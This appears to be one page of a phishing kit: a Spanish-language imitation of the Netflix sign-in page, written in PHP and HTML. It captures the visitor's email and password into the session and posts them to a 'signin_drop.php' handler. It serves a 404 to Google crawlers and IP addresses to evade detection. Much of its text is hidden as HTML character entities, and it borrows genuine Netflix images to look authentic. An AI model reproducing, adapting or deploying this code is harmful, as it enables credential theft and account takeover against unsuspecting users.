<?php

        session_start();
        error_reporting(0);
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_lang_en.php');
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        $_SESSION['_login_email_']    = $_POST['email'];
        $_SESSION['_login_password_'] = $_POST['password'];
        ########################################################
        ############### [+] HTTP_USER_AGENT [+] ################
        ########################################################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########################################################
?>
<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <meta charset="utf-8"/>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <title>Netflix</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link type="text/css" rel="stylesheet" href="../lib/css/codex.login.css"/>
      <link type="text/css" rel="stylesheet" href="../lib/css/signin.css">
      <link rel="shortcut icon" href="../lib/img/nficon2016.ico"/>
      <link rel="apple-touch-icon" href="../lib/img/nficon2016.png"/>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <script type="text/javascript">
    $(document).ready(function(){
    $('#submit').on('click', function () {
      if ($('#id_email').val() != '' && $('#id_password').val() != '') {
        $('#Rotation').fadeIn(300);
      }  
    });
});  
      </script>
   </head>
	
   <body>
      <div id="Rotation">
         <p style="font-size: 13px;">&#67;&#111;&#109;&#112;&#114;&#111;&#98;&#97;&#110;&#100;&#111;&#32;&#115;&#117;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#99;&#105;ón</p>
      </div>
       <div id="appMountPoint">
         <div class="login-wrapper hybrid-login-wrapper">
            <div class="login-wrapper-background" style="background-image:url( &#x27;https://assets.nflxext.com/ffe/siteui/vlv3/bd27b60f-02db-41da-8f5c-1558b01b44d0/17a20159-6c8b-4e60-be30-becbc0268684/DZ-en-20180813-popsignuptwoweeks-perspective_alpha_website_large.jpg&#x27; );" data-reactid="2"></div>
            <div class="nfHeader login-header signupBasicHeader">
              
               </a>
            </div>
            <div class="login-body">
               <div>
                  <div class="login-content login-form hybrid-login-form hybrid-login-form-signup">
                     <div class="hybrid-login-form-main">
                        <h1>&#73;&#110;&#105;&#99;&#105;&#97;&#32;&#115;&#101;&#115;&#105;ón</h1>
                        <?php if (isset($_GET['error'])){ ?>
                        <div class="ui-message-container ui-message-error">
                           <div class="ui-message-icon"></div>
                           <div class="ui-message-contents"><b>Contraseña &#105;&#110;&#99;&#111;&#114;&#114;&#101;&#99;&#116;&#97;. Reinté&#110;&#116;&#97;&#108;&#111;&#32;&#111;&#32;&#114;&#101;&#115;&#116;&#97;&#98;&#108;&#101;&#99;&#101;&#32;&#108;&#97;&#32;&#99;&#111;&#110;&#116;&#114;&#97;&#115;&#101;ña.</a>.</div>
                        </div>
                        <?php } ?>
                        <form method="post" action="signin_drop.php" id="form" class="idform">
                           <div class="nfInput nfPasswordInput login-input login-input-password">
                              <div class="nfInputPlacement" >
                                 <div class="nfPasswordControls" >
                                    <input required="" 
                                       name="email" 
                                       id="id_email" 
                                       type="text" 
                                       class="nfTextField" 
                                       autocomplete="off"
                                       placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#111;&#32; número de teléfono
" 
                                       oninvalid="this.setCustomValidity('&#73;&#110;&#103;&#114;&#101;&#115;&#101;&#32;&#117;&#110;&#32;&#101;&#109;&#97;&#105;&#108; o número de teléfono válido.')"
                                       oninput="setCustomValidity('')" 
                                       />
                                 </div>
                              </div>
                           </div>
                           <div class="nfInput nfPasswordInput login-input login-input-password" >
                              <div class="nfInputPlacement">
                                 <div class="nfPasswordControls">
                                    <input required="" 
                                    type="password" 
                                    name="password" 
                                    autocomplete="off"
                                    class="nfTextField" 
                                    id="id_password" 
                                    placeholder="Contraseña" 
                                    oninvalid="this.setCustomValidity('&#80;&#111;&#114;&#32;&#102;&#97;&#118;&#111;&#114;&#32;&#105;&#110;&#116;&#114;&#111;&#100;&#117;&#99;&#101;&#32;&#117;&#110;&#97;&#32;&#99;&#111;&#110;&#116;&#114;&#97;&#115;&#101;ña válida.')"
                                    oninput="setCustomValidity('')" 
                                    />
                                    <button id="id_password_toggle" type="button" class="nfPasswordToggle" title="Mostrar contraseña">MOSTRAR</button>
                                 </div>
                              </div>
                           </div>
                           <button class="btn login-button btn-submit btn-small" id="submit" type="submit">Inicia sesión</button>
                           <div class="hybrid-login-form-help">
                              <div class="ui-binary-input login-remember-me">
                                 <input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="0" checked="" /><label for="bxid_rememberMe_true"><span class="login-remember-me-label-text">Recuérdame
</span></label>
                                 <div class="helper"></div>
                              </div>
                              <a href="#LoginHelp" class="login-help-link">¿&#78;&#101;&#99;&#101;&#115;&#105;&#116;&#97;&#115;&#32;&#97;&#121;&#117;&#100;&#97;?</a>
                           </div>
                        </form>
                     </div>
                     <div class="hybrid-login-form-other">
                        <form method="post" class="login-form">
                           <div class="facebookForm regOption">
                              <div class="fb-minimal">
                                 <hr data-reactid="1024"/>
                                 <button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off">
                                    <div class="fb-login"><img class="icon-facebook" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png"/><span class="fbBtnText" data-reactid="1028">Iniciar sesión con Facebook</span></div>
                                 </button>
                              </div>
                           </div>
                        </form>
                        <div class="login-signup-now">¿&#69;&#114;&#101;&#115;&#32;&#110;&#117;&#101;&#118;&#111;&#32;&#101;&#110;&#32;&#78;&#101;&#116;&#102;&#108;&#105;&#120;?
<a class=" " target="_self" href="#">Regístrate ahora</a>.</div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="site-footer-wrapper login-footer">
               <div class="footer-divider"></div>
               <div class="site-footer">
                  <p class="footer-top"><a class="footer-top-a" href="#contactus">¿Preguntas? Contáctenos.</a></p>
                  <ul class="footer-links structural">
                     <li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item" ><a class="footer-link" href="#giftterms" placeholder="footer_responsive_link_gift_card_terms"><span id="">Condiciones de las tarjetas de regalo</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_terms_item" data-reactid="1052"><a class="footer-link" href="#termsofuse" placeholder="footer_responsive_link_terms"><span id="">Condiciones de uso</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_privacy_item" data-reactid="1055"><a class="footer-link" href="#privacy" placeholder="footer_responsive_link_privacy"><span id="">Declaracion de privacidad</span></a></li>
                  </ul>
                  <div class="lang-selection-container" id="lang-switcher">
                     <div class="ui-select-wrapper" >
                        <label class="ui-label no-display"><span class="ui-label-text"></span></label>
                        <div class="select-arrow medium prefix globe">
                           <select class="ui-select medium" tabindex="0" placeholder="lang-switcher">
                              <option value="#login">&#x46;&#x72;&#x61;&#x6E;&#xE7;&#x61;&#x69;&#x73;</option>
                              <option selected="" value="#login">&#x45;&#x6E;&#x67;&#x6C;&#x69;&#x73;&#x68;</option>
                           </select>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div>
      </div>
      <script type="text/javascript" src="../lib/js/jquery.placeholder.label.js"></script> 
      <script type="text/javascript" src="../lib/js/jquery.bootstrap.js"></script>
      
      <script type="text/javascript">
         $(document).ready(function (){
            $('input[placeholder]').placeholderLabel();
         })
      </script>
   </body>
</html>